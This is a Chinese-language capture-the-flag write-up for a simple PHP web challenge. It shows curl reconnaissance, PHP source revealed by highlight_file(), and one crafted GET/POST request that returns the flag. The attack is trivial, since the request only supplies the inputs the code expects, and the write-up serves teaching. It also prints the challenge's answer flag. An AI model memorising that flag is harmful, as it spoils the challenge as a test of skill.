# CTF Writeup: Web - PHP 逻辑绕过

## 题目信息
- **目标URL**: `http://node7.anna.nssctf.cn:26367/`
- **题目类型**: Web (PHP代码审计/逻辑绕过)
- **难易程度**: 简单

## 解题过程

### 1. 信息收集
**步骤**: 访问目标URL，获取初步信息。
**操作**: 
```bash
curl http://node7.anna.nssctf.cn:26367/
```
**结果**: 页面显示了“PHP练习”相关字样，并包含一个搜索功能。重要线索是页面HTML注释中的提示：
```html
<!-- 不要放过页面上的任何细节，包括注释 -->
```

### 2. 检查常见信息文件
**步骤**: 根据经验检查 `robots.txt`
**操作**:
```bash
curl http://node7.anna.nssctf.cn:26367/robots.txt
```
**结果**: 404 Not Found，但发现了服务器信息：
```
Apache/2.4.25 (Debian) Server at node7.anna.nssctf.cn Port 26367
```

### 3. 深入分析主页源码
**步骤**: 仔细分析主页的完整响应
**操作**: 再次访问主页，并关注完整的HTML
**结果**: 发现网页实际上是 `index.php` 使用 `highlight_file()` 输出的源码高亮页面。成功获取到后端PHP源代码：
```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

### 4. 分析代码逻辑
**关键条件**:
1. **POST参数**: `id` 必须等于字符串 `"wllmNB"`
2. **GET参数**: `json` 必须是一个有效的JSON字符串，解码后其 `x` 键的值必须等于 `"wllm"`

### 5. 构造攻击请求
**分析**: 需要同时满足POST和GET条件。

**构造的请求**:
- **URL**: `http://node7.anna.nssctf.cn:26367/?json={"x":"wllm"}`
- **POST数据**: `id=wllmNB`

**执行命令**:
```bash
curl -X POST 'http://node7.anna.nssctf.cn:26367/?json={"x":"wllm"}' --data 'id=wllmNB'
```

### 6. 获取Flag
**响应内容**:
```
<code>...PHP代码高亮部分...</code>
NSSCTF{3fc6bb0a-94e1-4e89-810b-d319ab0f4222}
```

## 关键知识点
1. **信息收集**: Web题第一步总是仔细检查页面源码，包括HTML注释。
2. **PHP代码审计**: `highlight_file()` 函数可以直接输出文件源码，便于审计。
3. **HTTP请求构造**: 需要同时满足GET和POST参数条件时，正确构造curl命令。
4. **逻辑绕过**: 题目本身没有复杂的漏洞，只需按照代码逻辑提供正确的输入。
